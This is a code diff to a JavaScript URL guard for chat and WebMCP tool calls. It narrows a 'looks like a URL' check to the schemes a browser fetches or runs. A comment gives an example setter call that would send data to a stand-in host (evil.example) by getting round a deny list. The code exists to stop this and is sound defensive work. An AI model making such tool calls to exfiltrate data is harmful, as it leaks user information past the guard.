@@ -108,15 +108,27 @@ export const CHAT_DENIED_URL_PARAMS = {
 // Generic setters, whose target control is picked by name when the call runs, so the table
 // above cannot know whether a value lands in a URL field. One does: an overlay's Image URL is
 // a plain string control that fetches on change, so setMenuValue({path: 'imageURL', value:
-// 'https://evil.example/?d=...'}) would walk round CHAT_DENIED_URL_PARAMS. No URL of any
-// kind is accepted here, matching WebMCP's own menu setter (validateMenuValue).
+// 'https://evil.example/?d=...'}) would walk round CHAT_DENIED_URL_PARAMS. No URL that a
+// browser fetches or runs is accepted here, matching WebMCP's own menu setter
+// (validateMenuValue).
 export const CHAT_DENIED_URL_VALUES = {
     setMenuValue: ['value'],
 };
 
-// True for anything carrying a scheme or a protocol-relative prefix. A free-text control that
-// holds a texture or feed URL would otherwise become an unreviewed fetch primitive, persisted
-// on the node and refetched after a save. Used by CHAT_DENIED_URL_VALUES above and by WebMCP.
+// The schemes that load something or run code when a value reaches a sink: web (http, https,
+// ws, wss, and ftp in older browsers), data, blob, file and filesystem, the browser-extension
+// schemes (an <img> or a TextureLoader loads an installed extension's web-accessible files
+// from chrome-extension:, moz-extension: and safari-web-extension:), and the script schemes
+// javascript and vbscript. Any other "word:" prefix is free text, not a URL: a browser cannot
+// load "plane:", so refusing "Plane: N123" or "Sighting: 21:30" would block timeline marker
+// labels, graph titles and grid names for no protection.
+const FETCHABLE_URL_SCHEME = new RegExp("^(?:https?|ftp|wss?|data|blob|file|filesystem"
+    + "|chrome-extension|moz-extension|safari-web-extension|javascript|vbscript):", "i");
+
+// True for a value with one of the schemes above or a protocol-relative prefix. A free-text
+// control that holds a texture or feed URL would otherwise become an unreviewed fetch
+// primitive, persisted on the node and refetched after a save. Used by CHAT_DENIED_URL_VALUES
+// above and by WebMCP.
 //
 // Test the string the *URL parser* will see, not the one that was typed. WHATWG URL strips
 // leading and trailing C0 controls and spaces, discards tab, CR and LF from anywhere in the
@@ -137,7 +149,7 @@ export function looksLikeURL(value) {
         // eslint-disable-next-line no-control-regex
         .replace(/[\u0009\u000A\u000D]/g, "")
         .replace(/\\/g, "/");
-    return /^[a-z][a-z0-9+.-]*:/i.test(normalized) || normalized.startsWith("//");
+    return FETCHABLE_URL_SCHEME.test(normalized) || normalized.startsWith("//");
 }
 
 // Mirrors CSitrecAPI._normalizeMediaSource. The guard has to test the string that will
